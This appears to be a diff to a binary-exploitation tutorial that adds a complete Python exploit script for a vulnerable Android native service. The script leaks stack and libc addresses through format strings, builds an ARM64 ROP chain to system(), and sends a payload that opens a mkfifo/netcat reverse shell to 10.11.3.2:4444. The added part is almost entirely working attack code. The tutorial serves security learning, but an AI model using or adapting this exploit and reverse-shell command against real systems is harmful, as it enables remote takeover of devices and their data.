@@ -230,9 +230,68 @@ Using the data collected above, we can start crafting an exploit!
 **`exploit.py`:**
 
 ```python
-from pwntools import *
+# Cleaner, easier to use, but recommended to use Python3 -- from pwntools import *
+import socket
+import time
+import struct
 
-# Note: This is rough boiler plate to help get you started, not a PoC
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-s.send
+s.connect(("10.11.0.1",6000))
+data = s.recv(200)
+# Leak Stack Address
+print "Step 1: Leak Stack Address!\n"
+s.send("%26$lx")            # Seemingly reoccurring address in debugger
+leakedStack = s.recv(200)   # Receive 200-bytes
+print "[+] Leaked process stack: 0x" + leakedStack   # Print received values from above
+
+print"---------------------------------------------"
+
+# Leak Libc address
+print "\nStep 2: Leak libc address from the stack!\n"
+print "[!] Leaking libc address and sending format string of %195$ls to our vulnerable program"
+s.send("%195$lx")           # Sending format string to program  
+leakedLibc = s.recv(200)    # Receive leaked libc address
+print "[+] Leaked libc address: 0x" + leakedLibc
+
+leakedStack = int("0x"+leakedStack, 16)
+leakedStackTop = leakedStack - 0x1B8
+print "[+] Calculated stack top: " + hex(leakedStackTop)
+
+print"---------------------------------------------"
+
+# Calculate Libc Base Address
+print "\nStep 3: Calculate libc base address\n"
+print "[!] Calculating libc base..."
+leakedOffset = 0x52FBC
+libcBase = int("0x"+leakedLibc, 16) - leakedOffset
+print "[+] Calculated libc base: "  , hex(libcBase)
+print"---------------------------------------------"
+
+prefix = "0xfa"
+
+overflow = "A"*208
+pc = "\xf0\x32\xe1\xca\x7c\x00\x00\x00"
+
+print"\nStep 4: Obtain gadget and system address\n"
+print"[!] Obtaining gadget address and system address from libc..."
+
+# 0x000000000007f96c: ldp x0, x8, [sp, #0x20]; ldr x27, [sp, #0x10]; str wzr, [x8]; blr x27; 
+pop_gadget = libcBase + 0x7f96c
+
+
+system = libcBase + 0x62F3C
+print "[+] Gadget address " , hex(pop_gadget)
+print "[+] System address " , hex(system)
+print"---------------------------------------------"
+
+
+# Use our leakedStackTop to find the beginning of our command on the stack
+system_args_address = leakedStackTop + 0xB0
+system_args= "rm /data/data/com.example.mynativetest/f;/system/bin/toybox mkfifo /data/data/com.example.mynativetest/f;cat /data/data/com.example.mynativetest/f|/system/bin/sh -i 2>&1|/system/bin/toybox nc 10.11.3.2 4444 >/data/data/com.example.mynativetest/f"
+
+# Build the exploit string
+exploit = prefix + overflow + struct.pack("<Q",pop_gadget) + "b" * 24 + struct.pack("<Q",system) + "b" * 8 + struct.pack("<Q",system_args_address) + struct.pack("<Q", leakedStackTop) + system_args
+
+s.send(exploit)
 ```
